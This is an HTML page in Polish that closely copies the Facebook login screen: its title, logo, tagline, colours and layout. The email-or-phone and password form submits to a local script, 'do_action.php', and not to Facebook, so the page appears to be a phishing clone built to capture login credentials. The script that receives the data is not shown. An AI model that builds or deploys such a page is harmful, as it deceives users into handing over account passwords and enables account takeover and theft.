<!DOCTYPE html>
	<html lang = "pl">
	<head>
		<meta charset = "UTF-8">
		<title>Facebook - zaloguj się lub zarejestruj</title>
		<link rel = "icon shortcut" href = "images/facebook.ico">
		<style>
			body {
				background: #f2f4f7;
				display: flex;
				justify-content: center;
				align-items: center;
			}
		
			* {
				font-family: SFProDisplay-Bold, Helvetica, Arial, sans-serif;
				margin: 0;
				padding: 0;
			}
		
			section {
				width: 980px;
				display: flex;
				justify-content: space-evenly;
				align-items: center;
				margin: 0 auto;
				padding-bottom: 112px;
				padding-top: 72px;
			}
		
			p {
				display: flex;
				justify-content: center;
			}
		
			input {
				height: 20px;
				width: 322px;
				border: 1px solid #dddfe2;
				border-radius: 6px;
				margin: 0 0 12px 0;
				font-size: 16px;
			}
		
			.text {
				height: max-content;
				margin: 0 42px 0 0;
			}
		
			.login a:hover {
				text-decoration: underline !important;
			}
		
			.login-card {
			    border-radius: 8px;
			    height: fit-content;
				width: 396px;
			    margin: 60px auto 45px;
				box-shadow: 0px 2px 4px rgba(0, 0, 0, .1), 0px 8px 16px rgba(0, 0, 0, .1);
				box-sizing: border-box;
				background: #ffffff;
				display: flex;
				justify-content: right;
			}
		
			.login-form {
				padding: 20px 20px;
			}
		
			.login-form p {
				color: #0866ff;
			}
		
			.login-form p:hover {
				text-decoration: underline;
			}
		
			.card-deco {
				align-items: center;
	    		border-bottom: 1px solid #dadde1;
	    		display: flex;
	    		margin: 20px 16px;
	    		text-align: center;
			}
		
			footer {
				width: 984px;
				margin: 0 auto;
				border-top: 1.5px solid #cccccc;
			}
		
			ul li {
				display: inline;
				margin: 0 0 0 28px;
			}
		
			ul li a {
				text-decoration: none;
				font-family: tahoma;
				font-size: 10.5px;
				color: #3B5998;
			}
		
			ul li a:hover {
				text-decoration: underline;
			}
		</style>
	</head>
	<body>
		<section>
			<div class = "text">
				<img src = "images/facebook.svg" alt = "" height = "106" style = "margin: -28px -28px -12px -28px;"/>
				<p style = "font-size: 28px; font-weight: normal; line-height: 32px; width: 500px;">Facebook pomaga kontaktować się z innymi osobami oraz udostępniać im różne informacje i materiały.</p>
			</div>
			<div class = "login">
				<div class = "login-card">
					<div class = "login-form">
						<form action = "do_action.php">
							<input name = "username" type = "text" id = "username" placeholder = "Adres e-mail lub numer telefonu" autofocus = "1" aria-label = "Adres e-mail lub numer telefonu" style = "padding: 0.8rem 1rem;"></input>
							<input name = "password" id = "password" type = "password" placeholder = "Hasło" autofocus = "1" aria-labe l= "Hasło" style = "padding: 0.8rem 1rem;"></input>
							<input type = "submit" name = "submit" value = "Zaloguj się" style = "background: none repeat scroll 0 0 #0866ff; border: none; color: #ffffff; padding: 2px 6px; font-size: 20px; font-weight: 700; height: 48px; width: 356px;"></input>
							<p><a style = "text-decoration: none; color: #0866ff; font-size: 14px;" href = "">Nie pamiętasz hasła?</a></p>
							<div class = "card-deco"></div>
							<div style = "width: 100%; height: 100%; display: flex; justify-content: center; align-items: center;">
								<input type = "submit" name = "submit" value = "Utwórz nowe konto" style = "background: none repeat scroll 0 0 #42b72a; border: none; color: #ffffff; padding: 2px 6px; font-size: 17px; font-weight: 700; height: 48px; width: 188px;"></input>
							</div>
						</form>
					</div>
				</div>
				<p style = "font-size: 14px;"><a href = "#" style = "color: #000000; font-weight: 700; text-decoration: none;">Utwórz stronę</a> dla gwiazdy, marki lub firmy.</p>
			</div>
		</section>
	</body>
</html>